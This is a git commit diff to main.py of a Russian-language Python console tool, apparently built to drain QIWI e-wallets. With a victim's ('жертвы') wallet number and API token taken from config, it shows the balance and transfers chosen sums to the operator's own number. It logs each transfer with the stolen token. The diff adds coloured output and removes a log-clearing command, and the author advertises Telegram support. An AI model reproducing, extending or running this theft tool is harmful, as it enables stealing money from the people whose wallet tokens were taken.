a9019712fd1f86ec320abedc8172262c3fe3fb0e
dokkywork <109424206+dokkywork@users.noreply.github.com>
2022-07-16 17:17:53 +0300

    Add files via upload

--- main.py
+++ main.py
@@ -11,18 +11,21 @@ tg: @dokky_work
 import os
 import time
 import logging
+import colorama
+from colorama import Fore, Back
 from SimpleQIWI import *
 from config import number, qiwi, token
 
 class Interface:
 	def mainMenu():
 		global api
-		print('Welcome!')
+		colorama.init()
+		print(Fore.CYAN +  'Welcome!')
 		time.sleep(1)
 		print('\n')
 		print('Ваш конфиг: ')
 		print('\n')
-		print('[1] Ваш Qiwi: ' + number)
+		print(Fore.MAGENTA+ '[1] Ваш Qiwi: ' + number)
 		print('[2] Qiwi жертвы: ' + qiwi)
 		print('[3] Токен: ' + token)
 		api = QApi(token = token, phone = qiwi)
@@ -30,17 +33,15 @@ class Interface:
 		logging.basicConfig(level='INFO', filename =t + '.log', filemode ='w', format='%(name)s - %(levelname)s - %(message)s')
 		time.sleep(1)
 		print('\n')
-		print('[!] Введите help - для показа команд')
+		print(Fore.MAGENTA + '[!] Введите help - для показа команд')
 		while True:
-			coml = str(input('>> '))
+			coml = str(input(Fore.CYAN + '>> '))
 			if coml == 'help':
 				Actions.help()
 			elif coml == 'balance':
 				Actions.balance()
 			elif coml == 'pay':
 				Actions.pay()
-			elif coml == 'logclear':
-				Actions.logclear()
 			else:
 				print('Команда не найдена. Введите help чтобы показать команды.')			
 
@@ -49,26 +50,25 @@ class Actions:
 	def help():
 		print('Список доступных команд: ')
 		print('\n')
-		print('help - отображение команд')
+		print(Fore.MAGENTA + 'help - отображение команд')
 		print('balance - показать баланс')
 		print('pay - перевод')
-		print('logclear - очистить лог-файл')
 		print('\n')
 	def pay():
 		print('[+] Введите сумму перевода:')
 		sum = str(input('>> '))
 		try:
 			api.pay(number, sum)
-			print('[√] Успешно!')
+			print(Fore.GREEN + '[√] Успешно!')
 			logging.info('pay ok' + ':' + sum + ':' + token + ':' + qiwi)
 		except:
-			print('[X] Что то пошло не так.. Попробуйте позже.')
-			print('[?] Если все еще не получается, напишите в tg: @dokky_work')
+			print(Fore.RED + '[X] Что то пошло не так.. Попробуйте позже.')
+			print(Fore.RED + '[?] Если все еще не получается, напишите в tg: @dokky_work')
 			logging.info('pay err' + ':' + sum + ':' + token + ':' + qiwi)
 	def balance():
 		print('\n')
 		print('[+] Баланс кошелька: ')
-		print(api.balance)
+		print(Fore.MAGENTA + api.balance)
 		print('\n')
 		
 		
